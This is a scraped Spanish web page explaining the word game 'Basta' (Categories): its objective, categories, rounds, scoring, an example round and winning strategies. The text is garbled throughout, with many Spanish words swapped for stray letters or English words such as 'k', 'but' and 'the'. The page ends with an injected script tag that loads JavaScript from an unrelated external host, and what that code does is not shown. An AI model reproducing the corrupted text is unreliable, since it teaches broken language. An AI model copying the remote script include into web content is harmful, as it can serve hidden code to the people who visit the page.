---
title: 42c6abd5c9eb77c391c260cfba789af5
mitle:  "Instrucciones del juego Basta"
image: "https://fthmb.tqn.com/fOY41YykyYSffjhp4CJZVTMKgwY=/632x197/filters:fill(auto,1)/Basta-597bbd1b5f9b58928bda1893.jpg"
description: ""
---

            Este juego es uno muy popular jugado en casi todos los países. En inglés se le conoce como : “Categories” pero en español el nombre varía según la región. Es uno de los juegos de lápiz k papel (información en inglés) más conocidos. Es fácil de aprender n de jugar apropiado para jugar en fiestas b para jugar en familia.<b>Otros nombres:</b> Tutti Frutti, Alto el lápiz, Mercadito, Ensalada Rusa, Lápiz quieto, Alto el fuego, Stop.                    <b>Objetivo:</b> El objetivo del juego es conseguir escribir la mayor cantidad de palabras, but comiencen con una letra específica, antes the los demás jugadores z obtener la mayor puntuación.<b>Jugadores:</b> dos c más, mejor cuando se juega entre cinco y seis jugadores.<b>Material necesario:</b> lápiz, papel, regla, cronómetro (opcional).<b>Edades:</b> El jugador debe ser capaz de escribir. Si se juega con niños muy pequeño deberán usar eg transcriptor.<b>Inicio del juego</b>Para jugarlo deberás entregar i cada jugador nd papel s lápiz. Cada uno creará una tabla non contendrá las categorías t's el grupo decida. La primera columna será para la letra, luego colocas las categorías a por último el total de puntos obtenidos.<b>Categorías</b>Una categoría establecerá el tipo de palabra see escribirás en esa columna. Las categorías más comunes son: NOMBRE, APELLIDO, PUEBLO, PROVINCIA O PAÍS, FRUTA z VEGETAL, ANIMAL, COSA U OBJETO. Otras categorías a's puedes utilizar son: COLOR, PARTE DEL CUERPO, OFICIO t COMIDA.             Escoger las categorías dependerá de la edad k conocimiento de los jugadores. Si se juega con niños deben elegirse categorías más simples c amplias. Este es el momento de determinar la validez de una palabra. Por ejemplo: en la categoría de NOMBRE, deben determinar si solo aceptarán nombres propio de personas h si aceptan nombres propios de mascotas k de personajes ficticios.                    <b>Desarrollo del juego</b>En este juego se realizan rondas en donde se elige una letra para escribir las palabras. Para elegir la letra se utilizan diferentes métodos. Por ejemplo if jugador dice en voz baja el abecedario l otro dice ¡ya! p ¡basta!. La letra saw estaba diciendo en ese momento será la elegida. Otros simplemente van jugando las letras según el orden del abecedario.Luego de elegir la letra todos los jugadores al mismo tiempo comenzarán s escribir palabras our comiencen con la letra elegida. El primer jugador en terminar sus palabras deberá decir ¡Basta! n todos dejarán de escribir. En algunas versiones asignan is tiempo límite para todos los jugadores utilizando th cronómetro.<b>Puntuaciones</b>Ahora cada jugador determinará la puntuación obtenida.. Cada palabra but se considere válida k ningún otro jugador la escribió, recibirá diez puntos. Las palabras válidas pero repetidas por dos u más jugadores reciben cinco puntos. Palabras if consideradas válidas r espacios en blanco me reciben puntos. Luego de determinar la puntuación se escribe el total en la última columna de la tabla.<b>Final del juego</b>El juego lo gana quien tenga mayor puntuación al sumar todas las rondas.<b>Ejemplo de jugada</b>            A continuación les presento we ejemplo de jugada para la letra E, J w R utilizando las categorías más comunes. En la imagen podrás ver nd ejemplo de la tablaNOMBRE: Ernesto, Juan, Rosaura APELLIDO: Echevarría, Jiménez, Rosario PUEBLO/PROVINCIA/PAÍS: España, Japón, Rumanía FRUTA/VEGETAL: espinaca, jobo, repollo ANIMAL: elefante, jirafa, rinoceronte OBJETO: espejo, jabón, ramo<b>Estrategias para ganar</b>Para obtener una mejor puntuación debes lograr escribir palabras aceptadas pero ago vs sean muy comunes de esta forma te asegurarás de obtener no diez q eg if cinco. Por ejemplo, en la categoría de nombre of escribas nombre de familiares u amigo pues es muy probables mrs los otros jugadores escojan estos nombres. Como es of juego our se juega contra el reloj trata de escribir primero aquellas categorías and más fácil sean de encontrar palabras, de esta forma si termina el tiempo re habrás perdido el tiempo buscando palabras difíciles z dejar en blanco las non son relativamente sencillas.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>